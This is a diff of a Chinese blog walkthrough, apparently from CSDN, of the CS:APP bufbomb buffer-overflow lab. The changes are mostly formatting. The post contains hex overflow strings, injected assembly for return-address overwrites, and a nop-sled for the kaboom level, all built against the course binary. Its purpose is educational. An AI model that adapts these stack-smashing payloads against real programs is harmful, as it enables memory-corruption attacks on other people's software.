@@ -184,11 +184,13 @@ void smoke()
  1. 将bufbomb可执行文件使用objdump进行反汇编`objdump -d bufbomb > bufbomb.d`
  2. 在bufbombd文件中找到getbuf函数
     ![请添加图片描述](https://img-blog.csdnimg.cn/92eea0bab9c74ead90aa920709ff2c3b.png)
-    在这里我们可以看到其中的`lea    -0x67(%ebp),%eax`指令的作用是指定缓冲区的大小，这里的`0x67`是16进制，所以缓冲区的大小就是103个字节。 
+
+    在这里我们可以看到其中的`lea -0x67(%ebp),%eax`指令的作用是指定缓冲区的大小，这里的`0x67`是16进制，所以缓冲区的大小就是103个字节。 
  3. 因为我们的目标是当 getbuf 过程执行它的 return 语句后，使 bufbomb 程序执行smoke过程的代码，所以我们需要覆盖掉getbuf栈帧的ret返回地址。找到smoke函数的入口地址为`0x080493d5`。
 ![请添加图片描述](https://img-blog.csdnimg.cn/246bba6ae7354c608ab56e10ee401409.png)
  4. 因为执行到getbuf时的栈帧中ebp+4存储的是test函数的ebp，而ebp+8为test的返回地址，所以我们需要在填满整个缓冲区后再覆盖掉8个字节，从而覆盖掉返回地址（小端存储）。
-`smoke.txt`:
+
+	`smoke.txt`:
 	```c
 	/*  103个字节对应0x67的空间大小  */
 	00 00 00 00 00 00 00 00 00 00
@@ -237,7 +239,8 @@ void fizz(int val)
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/57019347197f422aadadca1c4565f042.png)
     与level 0相似，攻击字符串需要将getbuf的ret返回地址覆盖为fizz函数的入口地址`0x08049402`
  2. 因为fizz的参数地址为`fizz的ebp+8`，而因为我们执行fizz是通过ret语句跳转执行，也就是在getbuf执行leave和ret后的栈帧为调用fizz的栈帧，所以`fizz的ebp+8`对应到getbuf中`103+4（test的ebp）+4（getbuf的ret）+4（fizz的ret）+4（fizz的参数）`，其中fizz的参数需要替换为cookie值（小端方式），可以使用`./makecookie 631907060609`查看， 我这里是`0x3b1a3827`。
-`fizz.txt`:
+
+	`fizz.txt`:
 	```c
 	/*  103个字节对应0x67的空间大小  */
 	00 00 00 00 00 00 00 00 00 00
@@ -309,7 +312,8 @@ void bang(int val)
 	objdump -d "./level2(bang)/attack.o" > "./level2(bang)/attack.d";
 	```
     将攻击代码反汇编，得到指令的机器码。 
-    `attack.d`:
+   
+   	 `attack.d`:
 	```c
 	./bang/attack.o:     file format elf32-i386
 	Disassembly of section .text:
@@ -321,7 +325,8 @@ void bang(int val)
 	```
 
  4. 将得到的机器码写入缓冲区中，将返回地址覆盖为缓冲区数组的起始地址（仍然使用小端方式）。
-`bang.txt`:
+
+	`bang.txt`:
 	```c
 	/*  103个字节对应0x67的空间大小  */
 	c7 05 a8 d1 04 08 27 38 1a 3b
@@ -373,7 +378,9 @@ void rumble(char *str)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/4896e11c09ad4f1a9cf1b5075dc675bc.png)
  2. 在bufbomb.d中找到rumble函数的入口地址
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/623fa7b5917f4cd884efff68b3e7b375.png)
- 3. 然后构造一个进入rumble函数的攻击代码`attack.S`:
+ 3. 然后构造一个进入rumble函数的攻击代码
+	
+	`attack.S`:
 
 	```c
 	push $0x1
@@ -415,7 +422,9 @@ void rumble(char *str)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/c688240d4602458a925315e361ac19bf.png)
 
  7. 这里我将数据保存在缓冲区中，str的首地址为缓冲区的首地址(0x55682f29)加上103减去8，计算可得str的首地址为`0x55682f88`。
+   
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/06793838cf7047099c7558c9e49758ac.png)
+	
 	修改`attack.S`:
 	
 	```c
@@ -457,7 +466,9 @@ void rumble(char *str)
 
  8. 不知道你们成功没有，我反正没成功。哈哈。Misfire就是失败了。
     	![在这里插入图片描述](https://img-blog.csdnimg.cn/58f975bdd6d5411a91baed5e643f721a.png)
+	
 	因为这个字符串只有前半部分，排查了一下原因，可能是后半部分的内存地址在getbuf过程覆盖后又被其他代码更改了。所以我就索性把字符串往前挪了4个字节。将str首地址改为0x55682f88-0x4=0x55682f84,并重新修改了attack.S和rumble.txt，流程跟上面是一样的，这里只把`attack.S`和`rumble.txt`给出来。
+	
 	`attack.S`:
 	```c
 	push $0x55682f84
@@ -465,6 +476,7 @@ void rumble(char *str)
 	push $0x08049514
 	ret
 	```
+	
 	`rumble.txt`:
 	```c
 	/*  103个字节对应0x67的空间大小  */
@@ -501,6 +513,7 @@ void rumble(char *str)
  1. 通过反汇编可以查看getbuf的返回地址为`0x8049584`,同时可以看出getbuf返回的值被保存在了寄存器eax中，所以我们的攻击代码应该将cookie放到eax里。
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/241b710de8464a4ba9985d51b6013fb7.png)
  2. 攻击代码的内容只需要把cookie值放入eax，然后返回到getbuf的下条指令继续执行即可。
+	
 	 `attack.S`:
 	```c
 	movl $0x3b1a3827,%eax
@@ -510,6 +523,7 @@ void rumble(char *str)
  3. 此外还需要把test过程的ebp保存在栈帧中,按类似bang过程的配置完`luanch.json`后，进入GDB调试，在test过程打个断点，可以获取test过程的ebp为`0x55682fb0`(记得要点击调用堆栈的test)
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/d787a8b6cff844949b5ca8d0499911f9.png)
  4. 将攻击代码反汇编后放到boom.txt里，并将ebp覆盖为test的ebp(其实就是没有覆盖) 
+	
 	`boom.txt`:
 	```c
 	/*  103个字节对应0x67的空间大小  */
@@ -575,10 +589,12 @@ void rumble(char *str)
     ```
        随便在`kaboom.txt`里写点东西，转成`kaboom-row.txt`后进入调试
  3. 可以得到五次getbufn的缓冲区首地址分别为`0x55682ca1` `0x55682c41` `0x55682ce1` `0x55682c51`  `0x55682c51`。因为每次都是用的同一个`kaboom.txt`文件，而缓冲区的首地址又不一样，所以需要使用nop指令(0x90)使得每次都能执行攻击代码。这里使用`0x55682da1`作为覆盖的入口地址。
+    
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/1aff159ef42049da9103da61b6be25fd.png)
     
     > 覆盖test的入口地址要大于或等于这五个地址的最大的地址（`0x55682ce1`），并且小于真正执行攻击代码的起始地址
  4. 因为需要使test过程正常执行，所以攻击代码在boom的基础上，还需要动态的复原test过程的ebp（因为每次test的ebp都不一样）。
+   
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/ee4b86e620c241e9bf360b6fac76c102.png)
     
     `attack.S`:
@@ -590,6 +606,7 @@ void rumble(char *str)
     ret
     ```
  5. 将反汇编的攻击代码写入缓冲区中
+	
 	`kaboom.txt`:
 	```c
 	/*  735个字节对应0x2df的空间大小  */
@@ -607,10 +624,12 @@ void rumble(char *str)
 	a1 2d 68 55
 	```
  6. 最后执行命令: 
+	
 	```c
 	./hex2raw -n < "./level5(kaboom)/kaboom.txt" > "./level5(kaboom)/kaboom-row.txt";
 	./bufbomb -n -u 631907060609 < "./level5(kaboom)/kaboom-row.txt";
 	```
+   
     ![在这里插入图片描述](https://img-blog.csdnimg.cn/bbe402b54f2a414facafec9ef1615270.png)
     成功过关！
 
